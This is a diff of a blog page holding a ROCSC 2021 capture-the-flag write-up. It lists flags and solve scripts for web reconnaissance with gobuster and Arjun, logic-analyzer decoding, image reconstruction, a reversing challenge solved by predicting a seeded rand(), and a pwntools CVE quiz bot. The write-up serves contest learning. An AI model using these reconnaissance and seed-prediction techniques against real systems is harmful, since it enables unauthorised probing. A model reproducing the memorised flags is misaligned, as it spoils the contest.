-                arr <span class="token operator">=</span> np<span class="token punctuation">.</span>c_<span class="token punctuation">[</span>arr<span class="token punctuation">,</span> <span class="token number">255</span><span class="token operator">*</span>np<span class="token punctuation">.</span>ones<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>arr<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span> np<span class="token punctuation">.</span>uint8<span class="token punctuation">)</span><span class="token punctuation">]</span>
-        img <span class="token operator">=</span>  Image<span class="token punctuation">.</span>frombuffer<span class="token punctuation">(</span>mode<span class="token punctuation">,</span> imgsize<span class="token punctuation">,</span> arr<span class="token punctuation">.</span>tostring<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">'raw'</span><span class="token punctuation">,</span> mode<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span>
-        img<span class="token punctuation">.</span>save<span class="token punctuation">(</span>destFile<span class="token punctuation">)</span>
+def _saveImage(img, imgsize, destFile):
+        mode &#x3D; &#39;RGBA&#39;
+        arr &#x3D; img.reshape(img.shape[0]*img.shape[1], img.shape[2])
+        if len(arr[0]) &#x3D;&#x3D; 3:
+                arr &#x3D; np.c_[arr, 255*np.ones((len(arr),1), np.uint8)]
+        img &#x3D;  Image.frombuffer(mode, imgsize, arr.tostring(), &#39;raw&#39;, mode, 0, 1)
+        img.save(destFile)
 
-<span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
-        img <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"/mnt/c/Users/iulia/Desktop/CrossFolder/ceva.png"</span><span class="token punctuation">,</span> <span class="token string">"rb"</span><span class="token punctuation">)</span>
-        pixels <span class="token operator">=</span> <span class="token builtin">list</span><span class="token punctuation">(</span>img<span class="token punctuation">)</span>
-        pixels <span class="token operator">=</span> <span class="token string">b""</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token punctuation">[</span>x <span class="token keyword">for</span> x <span class="token keyword">in</span> pixels<span class="token punctuation">]</span><span class="token punctuation">)</span>
-        <span class="token comment">#print(pixels)</span>
+def main():
+        img &#x3D; open(&quot;&#x2F;mnt&#x2F;c&#x2F;Users&#x2F;iulia&#x2F;Desktop&#x2F;CrossFolder&#x2F;ceva.png&quot;, &quot;rb&quot;)
+        pixels &#x3D; list(img)
+        pixels &#x3D; b&quot;&quot;.join([x for x in pixels])
+        #print(pixels)
 
-        <span class="token comment">#img = Image.frombuffer("L", (2000, 2000), pixels)</span>
-        data <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"ceva.png"</span><span class="token punctuation">,</span> <span class="token string">"rb"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>
-        img <span class="token operator">=</span> Image<span class="token punctuation">.</span>frombuffer<span class="token punctuation">(</span>data <span class="token operator">=</span> data<span class="token punctuation">,</span> mode <span class="token operator">=</span> <span class="token string">"RGB"</span><span class="token punctuation">,</span> size <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token number">1175</span><span class="token punctuation">,</span> <span class="token number">1056</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>rotate<span class="token punctuation">(</span><span class="token number">180</span><span class="token punctuation">)</span>
-        <span class="token comment">#image = Image.frombytes("RGB", (1175, 1056), bytes(bytearray(img2)))</span>
-        img<span class="token punctuation">.</span>save<span class="token punctuation">(</span><span class="token string">"asddd.png"</span><span class="token punctuation">)</span>
+        #img &#x3D; Image.frombuffer(&quot;L&quot;, (2000, 2000), pixels)
+        data &#x3D; open(&quot;ceva.png&quot;, &quot;rb&quot;).read()
+        img &#x3D; Image.frombuffer(data &#x3D; data, mode &#x3D; &quot;RGB&quot;, size &#x3D; (1175, 1056)).rotate(180)
+        #image &#x3D; Image.frombytes(&quot;RGB&quot;, (1175, 1056), bytes(bytearray(img2)))
+        img.save(&quot;asddd.png&quot;)
 
-        <span class="token comment">#with open("altceva.png", "wb") as f:</span>
-        <span class="token comment">#       for pixel in img2:</span>
-        <span class="token comment">#               f.write(pixel)</span>
+        #with open(&quot;altceva.png&quot;, &quot;wb&quot;) as f:
+        #       for pixel in img2:
+        #               f.write(pixel)
 
-<span class="token keyword">if</span> __name__<span class="token operator">==</span><span class="token string">"__main__"</span><span class="token punctuation">:</span>
-        main<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+if __name__&#x3D;&#x3D;&quot;__main__&quot;:
+        main()</code></pre>
 
 <h2 id="reccon-160-Web"><a href="#reccon-160-Web" class="headerlink" title="reccon(160): Web"></a>reccon(160): Web</h2><h4 id="Proof-of-Flag-9"><a href="#Proof-of-Flag-9" class="headerlink" title="Proof of Flag"></a>Proof of Flag</h4><p>CTF{486cdfe3a59141aca752fb10b44c70facca9c5b1d7be444aa840d14148030e66}</p>
 <h4 id="Summary-9"><a href="#Summary-9" class="headerlink" title="Summary"></a>Summary</h4><p>We get a webserver again with just a simple image in the center.</p>
 <h4 id="Proof-of-Solving-9"><a href="#Proof-of-Solving-9" class="headerlink" title="Proof of Solving"></a>Proof of Solving</h4><p>So we start with our basic enumeration using gobuster. We didn’t find anything interesting so the next scan is <strong>FUZZING</strong> for arguments.<br>So launch <strong>ARJUN</strong> and we find that there are a couple of arguments.<br>We enter them manually and we can see that at <strong>&#x2F;?m</strong> we get the flag</p>
 <img src="/2021/12/08/rocsc-2021/20210830145349.png" class="">
 
-<h4 id="Proof-of-Code-4"><a href="#Proof-of-Code-4" class="headerlink" title="Proof of Code"></a>Proof of Code</h4><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests
+<h4 id="Proof-of-Code-4"><a href="#Proof-of-Code-4" class="headerlink" title="Proof of Code"></a>Proof of Code</h4><pre class="line-numbers language-python" data-language="python"><code class="language-python">import requests
 
-r <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"http://34.141.59.125:32391/?m"</span><span class="token punctuation">)</span>
-<span class="token keyword">print</span><span class="token punctuation">(</span>r<span class="token punctuation">.</span>content<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+r &#x3D; requests.get(&quot;http:&#x2F;&#x2F;34.141.59.125:32391&#x2F;?m&quot;)
+print(r.content)</code></pre>
 
 <h2 id="RGB-led-matrix-320-Misc"><a href="#RGB-led-matrix-320-Misc" class="headerlink" title="RGB_led_matrix(320): Misc"></a>RGB_led_matrix(320): Misc</h2><h4 id="Proof-of-Flag-10"><a href="#Proof-of-Flag-10" class="headerlink" title="Proof of Flag"></a>Proof of Flag</h4><p>CTF{29ca0ea1e1a1117fc8007bfdbadd395a5945bc61feea659f1791b30b066f9363}</p>
 <h4 id="Summary-10"><a href="#Summary-10" class="headerlink" title="Summary"></a>Summary</h4><p>We have a log communication between a micro-controller and the display with a DS Logic Analyzer.</p>
 <h4 id="Proof-of-Solving-10"><a href="#Proof-of-Solving-10" class="headerlink" title="Proof of Solving"></a>Proof of Solving</h4><p>We need to open <strong>PulseView</strong> and add a decoder.<br>The decoder we need to add is <strong>rgb led ws281x</strong><br>After that we export it and we try to make a photo.<br>So I found a script on google and modify it a little bit.</p>
-<h4 id="Proof-of-Code-5"><a href="#Proof-of-Code-5" class="headerlink" title="Proof of Code"></a>Proof of Code</h4><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#!/usr/bin/python</span>
-white <span class="token operator">=</span> <span class="token string">'\x1b[7m  \x1b[0m'</span>
-black <span class="token operator">=</span> <span class="token string">'\x1b[49m  \x1b[0m'</span>
+<h4 id="Proof-of-Code-5"><a href="#Proof-of-Code-5" class="headerlink" title="Proof of Code"></a>Proof of Code</h4><pre class="line-numbers language-python" data-language="python"><code class="language-python">#!&#x2F;usr&#x2F;bin&#x2F;python
+white &#x3D; &#39;\x1b[7m  \x1b[0m&#39;
+black &#x3D; &#39;\x1b[49m  \x1b[0m&#39;
 
 
-<span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'adno'</span><span class="token punctuation">,</span> <span class="token string">'r'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>
-    data <span class="token operator">=</span> f<span class="token punctuation">.</span>readlines<span class="token punctuation">(</span><span class="token punctuation">)</span>
+with open(&#39;adno&#39;, &#39;r&#39;) as f:
+    data &#x3D; f.readlines()
 
-pixels <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>
+pixels &#x3D; []
 
-<span class="token keyword">def</span> <span class="token function">chunks</span><span class="token punctuation">(</span>lst<span class="token punctuation">,</span> n<span class="token punctuation">)</span><span class="token punctuation">:</span>
-    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token builtin">len</span><span class="token punctuation">(</span>lst<span class="token punctuation">)</span><span class="token punctuation">,</span> n<span class="token punctuation">)</span><span class="token punctuation">:</span>
-        <span class="token keyword">yield</span> lst<span class="token punctuation">[</span>i<span class="token punctuation">:</span>i <span class="token operator">+</span> n<span class="token punctuation">]</span>
+def chunks(lst, n):
+    for i in range(0, len(lst), n):
+        yield lst[i:i + n]
 
-<span class="token keyword">for</span> line <span class="token keyword">in</span> data<span class="token punctuation">:</span>
-    byte <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>line<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">7</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span>
-    <span class="token keyword">if</span> byte <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">:</span>
-        byte <span class="token operator">=</span> <span class="token number">1</span>
-    pixels<span class="token punctuation">.</span>append<span class="token punctuation">(</span>byte<span class="token punctuation">)</span>
+for line in data:
+    byte &#x3D; int(line[-7:], 16)
+    if byte !&#x3D; 0:
+        byte &#x3D; 1
+    pixels.append(byte)
 
-pixels <span class="token operator">=</span> <span class="token builtin">list</span><span class="token punctuation">(</span>chunks<span class="token punctuation">(</span>pixels<span class="token punctuation">,</span> <span class="token number">248</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
-pixels<span class="token punctuation">.</span>reverse<span class="token punctuation">(</span><span class="token punctuation">)</span>
+pixels &#x3D; list(chunks(pixels, 248))
+pixels.reverse()
 
-matrix <span class="token operator">=</span> <span class="token number">8</span> <span class="token operator">*</span> <span class="token punctuation">[</span><span class="token number">31</span> <span class="token operator">*</span> <span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">]</span>
+matrix &#x3D; 8 * [31 * [0]]
 
-<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>pixels<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
-    chunk <span class="token operator">=</span> pixels<span class="token punctuation">[</span>i<span class="token punctuation">]</span>
-    chunk <span class="token operator">=</span> <span class="token builtin">list</span><span class="token punctuation">(</span>chunks<span class="token punctuation">(</span>chunk<span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
-    chunk<span class="token punctuation">.</span>reverse<span class="token punctuation">(</span><span class="token punctuation">)</span>
-    <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>chunk<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">7</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
-        line <span class="token operator">=</span> chunk<span class="token punctuation">[</span>j<span class="token punctuation">]</span>
-        <span class="token keyword">if</span> j <span class="token operator">%</span> <span class="token number">2</span> <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">:</span>
-            line<span class="token punctuation">.</span>reverse<span class="token punctuation">(</span><span class="token punctuation">)</span>
+for i in range(len(pixels)):
+    chunk &#x3D; pixels[i]
+    chunk &#x3D; list(chunks(chunk, 8))
+    chunk.reverse()
+    for j in range(len(chunk[-7:])):
+        line &#x3D; chunk[j]
+        if j % 2 &#x3D;&#x3D; 1:
+            line.reverse()
 
-        <span class="token keyword">for</span> c <span class="token keyword">in</span> line<span class="token punctuation">:</span>
-            <span class="token keyword">if</span> c <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>
-                <span class="token keyword">print</span><span class="token punctuation">(</span>white<span class="token punctuation">,</span> end<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">)</span>
-            <span class="token keyword">else</span><span class="token punctuation">:</span>
-                <span class="token keyword">print</span><span class="token punctuation">(</span>black<span class="token punctuation">,</span> end<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">)</span>
+        for c in line:
+            if c &#x3D;&#x3D; 0:
+                print(white, end&#x3D;&#39;&#39;)
+            else:
+                print(black, end&#x3D;&#39;&#39;)
 
-        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+        print()</code></pre>
 
 <h2 id="OLED-380-Misc"><a href="#OLED-380-Misc" class="headerlink" title="OLED(380): Misc"></a>OLED(380): Misc</h2><h4 id="Proof-of-Flag-11"><a href="#Proof-of-Flag-11" class="headerlink" title="Proof of Flag"></a>Proof of Flag</h4><h4 id="Summary-11"><a href="#Summary-11" class="headerlink" title="Summary"></a>Summary</h4><p>We have a communication between OLED and the micro-controller.<br>We can see it using DSView.<br>After poking with the parameters for a couple of hours the best combination decoders and arguments are: 1,4,2 and active-high<br>It needs to be <strong>ACTIVE-HIGH</strong> because the <strong>ACTIVE-LOW</strong> will remove and strip some pixels from the image so you won’t be able to extract the data from the QR Code.<br>But you can know that those are good just after you export the data as <strong>.csv</strong> and try it.</p>
 <img src="/2021/12/08/rocsc-2021/20210830164611.png" class="">
@@ -442,53 +442,53 @@ matrix <span class="token operator">=</span> <span class="token number">8</span>
 <h4 id="Proof-of-Solving-11"><a href="#Proof-of-Solving-11" class="headerlink" title="Proof of Solving"></a>Proof of Solving</h4><p>But how ? How should I script that ? Well if you search for oled ctf writeups you can find a lot of links and from one of them I got the script.<br>You just need to change the <strong>N_COLUMNS</strong> and something else and you are ready for using it.<br>You can see that it’s giving you a QR Code<br>I scanned it with QRScanner from my IPhone.</p>
 <img src="/2021/12/08/rocsc-2021/20210830205735.png" class="">
 
-<h4 id="Proof-of-Code-6"><a href="#Proof-of-Code-6" class="headerlink" title="Proof of Code"></a>Proof of Code</h4><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> pandas <span class="token keyword">as</span> pd
-<span class="token keyword">import</span> matplotlib<span class="token punctuation">.</span>pyplot <span class="token keyword">as</span> plt 
-<span class="token keyword">import</span> numpy <span class="token keyword">as</span> np
+<h4 id="Proof-of-Code-6"><a href="#Proof-of-Code-6" class="headerlink" title="Proof of Code"></a>Proof of Code</h4><pre class="line-numbers language-python" data-language="python"><code class="language-python">import pandas as pd
+import matplotlib.pyplot as plt 
+import numpy as np
 
-N_PAGES <span class="token operator">=</span> <span class="token number">8</span>
-N_ROWS <span class="token operator">=</span> <span class="token number">64</span>
-N_COLUMNS <span class="token operator">=</span> <span class="token number">131</span>
+N_PAGES &#x3D; 8
+N_ROWS &#x3D; 64
+N_COLUMNS &#x3D; 131
 
-<span class="token keyword">def</span> <span class="token function">show_lcd</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">:</span>
-  screen <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>
-  <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>N_ROWS<span class="token punctuation">)</span><span class="token punctuation">:</span>
-    screen<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">*</span> N_COLUMNS<span class="token punctuation">)</span>
+def show_lcd(data):
+  screen &#x3D; []
+  for i in range(N_ROWS):
+    screen.append([0] * N_COLUMNS)
 
-  <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>N_PAGES<span class="token punctuation">)</span><span class="token punctuation">:</span>
-    <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>N_COLUMNS<span class="token punctuation">)</span><span class="token punctuation">:</span>
-      <span class="token comment"># Convert each byte to a binary string</span>
-      bits <span class="token operator">=</span> <span class="token string">"&#123;0:08b&#125;"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>data<span class="token punctuation">[</span>N_COLUMNS<span class="token operator">*</span>i<span class="token operator">+</span>j<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span>
-      <span class="token keyword">for</span> l<span class="token punctuation">,</span> b <span class="token keyword">in</span> <span class="token builtin">enumerate</span><span class="token punctuation">(</span>bits<span class="token punctuation">)</span><span class="token punctuation">:</span>
-        <span class="token comment"># Draw pixels into the screen</span>
-        screen<span class="token punctuation">[</span>N_PAGES<span class="token operator">*</span>i<span class="token operator">+</span>l<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>b<span class="token punctuation">)</span>
+  for i in range(N_PAGES):
+    for j in range(N_COLUMNS):
+      # Convert each byte to a binary string
+      bits &#x3D; &quot;&#123;0:08b&#125;&quot;.format(data[N_COLUMNS*i+j])[::-1]
+      for l, b in enumerate(bits):
+        # Draw pixels into the screen
+        screen[N_PAGES*i+l][j] &#x3D; int(b)
 
-  X <span class="token operator">=</span> np<span class="token punctuation">.</span>array<span class="token punctuation">(</span>screen<span class="token punctuation">)</span>
-  plt<span class="token punctuation">.</span>imshow<span class="token punctuation">(</span>X<span class="token punctuation">,</span> cmap<span class="token operator">=</span><span class="token string">"gray"</span><span class="token punctuation">)</span> 
-  plt<span class="token punctuation">.</span>show<span class="token punctuation">(</span><span class="token punctuation">)</span> 
+  X &#x3D; np.array(screen)
+  plt.imshow(X, cmap&#x3D;&quot;gray&quot;) 
+  plt.show() 
 
 
-data <span class="token operator">=</span> pd<span class="token punctuation">.</span>read_csv<span class="token punctuation">(</span><span class="token string">'data.csv'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token string">'mosi'</span><span class="token punctuation">]</span>
-data <span class="token operator">=</span> data<span class="token punctuation">[</span><span class="token number">4165</span><span class="token punctuation">:</span><span class="token punctuation">]</span> <span class="token comment"># Remove the first 25 bytes</span>
-data <span class="token operator">=</span> <span class="token builtin">list</span><span class="token punctuation">(</span>data<span class="token punctuation">.</span><span class="token builtin">map</span><span class="token punctuation">(</span><span class="token keyword">lambda</span> h<span class="token punctuation">:</span> <span class="token builtin">int</span><span class="token punctuation">(</span>h<span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment"># Convert hex string to list of bytes</span>
+data &#x3D; pd.read_csv(&#39;data.csv&#39;)[&#39;mosi&#39;]
+data &#x3D; data[4165:] # Remove the first 25 bytes
+data &#x3D; list(data.map(lambda h: int(h, 16))) # Convert hex string to list of bytes
 
-sequence_size <span class="token operator">=</span> N_PAGES <span class="token operator">*</span> N_COLUMNS
-<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
-  show_lcd<span class="token punctuation">(</span>data<span class="token punctuation">[</span>sequence_size<span class="token operator">*</span>i<span class="token punctuation">:</span>sequence_size<span class="token operator">*</span><span class="token punctuation">(</span>i<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+sequence_size &#x3D; N_PAGES * N_COLUMNS
+for i in range(6):
+  show_lcd(data[sequence_size*i:sequence_size*(i+1)])</code></pre>
 
 <h2 id="speed-50-Rev"><a href="#speed-50-Rev" class="headerlink" title="speed(50): Rev"></a>speed(50): Rev</h2><h4 id="Proof-of-Flag-12"><a href="#Proof-of-Flag-12" class="headerlink" title="Proof of Flag"></a>Proof of Flag</h4><p>CTF{cd60564f35f0e0667ebca28c67faf5f0327ee74560e9c1058cfbe42c9be194e8}</p>
 <h4 id="Summary-12"><a href="#Summary-12" class="headerlink" title="Summary"></a>Summary</h4><p>We get an executable that it’s initializing a variable to rand()<br>Inside nothing_here() we have the seed so basically it’s pretty easy to solve this one.<br>Given the seed used to generate the random number is known to us, we can generate the exact same numbers by using the same seed in our rand() function call which will allow us to predict the values generated by binary</p>
 <h4 id="Proof-of-Solving-12"><a href="#Proof-of-Solving-12" class="headerlink" title="Proof of Solving"></a>Proof of Solving</h4><p>This is the code that we need to exploit</p>
 <img src="/2021/12/08/rocsc-2021/20210830184439.png" class="">
 
-<h4 id="Proof-of-Code-7"><a href="#Proof-of-Code-7" class="headerlink" title="Proof of Code"></a>Proof of Code</h4><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> ctypes
-LIBC <span class="token operator">=</span> ctypes<span class="token punctuation">.</span>cdll<span class="token punctuation">.</span>LoadLibrary<span class="token punctuation">(</span><span class="token string">'/lib/x86_64-linux-gnu/libc.so.6'</span><span class="token punctuation">)</span>
-LIBC<span class="token punctuation">.</span>srand<span class="token punctuation">(</span><span class="token number">0x11C4</span><span class="token punctuation">)</span>
-v1 <span class="token operator">=</span> LIBC<span class="token punctuation">.</span>rand<span class="token punctuation">(</span><span class="token punctuation">)</span>
-v2 <span class="token operator">=</span> <span class="token number">0</span>
-v1 <span class="token operator">^</span> v2 <span class="token operator">^</span> <span class="token number">0x539</span>
-<span class="token keyword">import</span> hashlib
-num <span class="token operator">=</span> hashlib<span class="token punctuation">.</span>sha256<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>v1 <span class="token operator">^</span> v2 <span class="token operator">^</span> <span class="token number">0x539</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">"utf-8"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<h4 id="Proof-of-Code-7"><a href="#Proof-of-Code-7" class="headerlink" title="Proof of Code"></a>Proof of Code</h4><pre class="line-numbers language-python" data-language="python"><code class="language-python">import ctypes
+LIBC &#x3D; ctypes.cdll.LoadLibrary(&#39;&#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;libc.so.6&#39;)
+LIBC.srand(0x11C4)
+v1 &#x3D; LIBC.rand()
+v2 &#x3D; 0
+v1 ^ v2 ^ 0x539
+import hashlib
+num &#x3D; hashlib.sha256((str(v1 ^ v2 ^ 0x539)).encode(&quot;utf-8&quot;)).hexdigest()</code></pre>
 
 <h2 id="where-do-you-go-300-Misc"><a href="#where-do-you-go-300-Misc" class="headerlink" title="where-do-you-go(300): Misc"></a>where-do-you-go(300): Misc</h2><h4 id="Proof-of-Flag-13"><a href="#Proof-of-Flag-13" class="headerlink" title="Proof of Flag"></a>Proof of Flag</h4><p>ctf{83ac8f43b6dc92217de38ce84b5b3bb4e067642dfbf76a35dcf03cbb1508b956}</p>
 <h4 id="Summary-13"><a href="#Summary-13" class="headerlink" title="Summary"></a>Summary</h4><p>We get a server and a port were we need to connect to.<br>After connecting with <code>nc</code> we can see that the server is asking us for some CVE-IDs.</p>
@@ -496,56 +496,56 @@ num <span class="token operator">=</span> hashlib<span class="token punctuation"
 
 <p>So the only think I though I could do is a crawler that get’s the questions and reply them with the hope that after a couple of questions I will get the flag.</p>
 <h4 id="Proof-of-Solving-13"><a href="#Proof-of-Solving-13" class="headerlink" title="Proof of Solving"></a>Proof of Solving</h4><p>Firstly I tried with just requesting some questions from <strong>CVE.MITRE</strong> but after some questions I would get an error because that question wasn’t present on the CVE.MITRE website.<br>So I addopted a new <em>technique</em> that uses 2 websites and searches for the CVE-ID but also that was failing after some questions.<br>So I searched a database with all <strong>2019-2020-2021</strong> CVEs and imported them locally. (<a target="_blank" rel="noopener" href="https://nvd.nist.gov/vuln/data-feeds">https://nvd.nist.gov/vuln/data-feeds</a>)</p>
-<h4 id="Proof-of-Code-8"><a href="#Proof-of-Code-8" class="headerlink" title="Proof of Code"></a>Proof of Code</h4><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#!/usr/bin/python</span>
-<span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
-<span class="token keyword">import</span> json
+<h4 id="Proof-of-Code-8"><a href="#Proof-of-Code-8" class="headerlink" title="Proof of Code"></a>Proof of Code</h4><pre class="line-numbers language-python" data-language="python"><code class="language-python">#!&#x2F;usr&#x2F;bin&#x2F;python
+from pwn import *
+import json
 
-proxies <span class="token operator">=</span> <span class="token punctuation">&#123;</span>
-  <span class="token string">'http'</span><span class="token punctuation">:</span> <span class="token string">'http://localhost:8080'</span><span class="token punctuation">,</span>
-<span class="token punctuation">&#125;</span>
+proxies &#x3D; &#123;
+  &#39;http&#39;: &#39;http:&#x2F;&#x2F;localhost:8080&#39;,
+&#125;
 
-db <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>
+db &#x3D; &#123;&#125;
 
-<span class="token keyword">def</span> <span class="token function">json_cve</span><span class="token punctuation">(</span><span class="token builtin">file</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
-        f <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token builtin">file</span><span class="token punctuation">,</span> <span class="token string">"r"</span><span class="token punctuation">)</span>
-        data <span class="token operator">=</span> json<span class="token punctuation">.</span>load<span class="token punctuation">(</span>f<span class="token punctuation">)</span>
-        cves <span class="token operator">=</span> data<span class="token punctuation">[</span><span class="token string">"CVE_Items"</span><span class="token punctuation">]</span>
-        <span class="token keyword">for</span> cve <span class="token keyword">in</span> cves<span class="token punctuation">:</span>
-                <span class="token builtin">id</span> <span class="token operator">=</span> cve<span class="token punctuation">[</span><span class="token string">"cve"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"CVE_data_meta"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"ID"</span><span class="token punctuation">]</span>
-                desc <span class="token operator">=</span> cve<span class="token punctuation">[</span><span class="token string">"cve"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"description"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"description_data"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"value"</span><span class="token punctuation">]</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">"ascii"</span><span class="token punctuation">,</span> <span class="token string">"ignore"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span>
-                db<span class="token punctuation">[</span>desc<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token builtin">id</span>
+def json_cve(file):
+        f &#x3D; open(file, &quot;r&quot;)
+        data &#x3D; json.load(f)
+        cves &#x3D; data[&quot;CVE_Items&quot;]
+        for cve in cves:
+                id &#x3D; cve[&quot;cve&quot;][&quot;CVE_data_meta&quot;][&quot;ID&quot;]
+                desc &#x3D; cve[&quot;cve&quot;][&quot;description&quot;][&quot;description_data&quot;][0][&quot;value&quot;].encode(&quot;ascii&quot;, &quot;ignore&quot;).decode()
+                db[desc] &#x3D; id
 
-<span class="token keyword">def</span> <span class="token function">search</span><span class="token punctuation">(</span>desc<span class="token punctuation">)</span><span class="token punctuation">:</span>
-        <span class="token keyword">return</span> db<span class="token punctuation">[</span>desc<span class="token punctuation">]</span>
+def search(desc):
+        return db[desc]
 
